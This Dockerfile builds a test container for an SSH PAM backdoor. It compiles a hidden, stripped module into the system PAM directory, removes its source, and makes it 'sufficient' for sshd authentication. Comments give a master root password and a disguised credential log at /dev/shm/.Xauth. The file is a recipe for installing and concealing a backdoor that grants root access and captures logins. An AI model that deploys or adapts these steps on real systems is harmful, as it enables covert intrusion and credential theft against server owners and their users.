# Isolated test environment for PAM backdoor
#
# Build:  docker build -t ssh-door-test .
# Run:    docker run -d -p 2222:22 --name ssh-test ssh-door-test
# Test:   ssh root@localhost -p 2222   (password: elliot)
# Logs:   docker exec ssh-test cat /dev/shm/.Xauth
# Shell:  docker exec -it ssh-test bash
# Clean:  docker rm -f ssh-test && docker rmi ssh-door-test

FROM debian:bookworm-slim

# Install SSH and build dependencies
RUN apt-get update && apt-get install -y \
    openssh-server \
    libpam0g-dev \
    libssl-dev \
    gcc \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir /var/run/sshd \
    && echo 'root:testpassword' | chpasswd \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config \
    && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Copy and compile the module
COPY pam_auth.c /tmp/
RUN cd /tmp && \
    gcc -fPIC -shared -O3 -s -fvisibility=hidden \
        -o /lib/x86_64-linux-gnu/security/pam_auth.so \
        pam_auth.c -lcrypto -lpam && \
    strip --strip-all /lib/x86_64-linux-gnu/security/pam_auth.so && \
    rm -f pam_auth.c

# Configure PAM
RUN sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd

# Expose SSH
EXPOSE 22

# Start SSH
CMD ["/usr/sbin/sshd", "-D"]
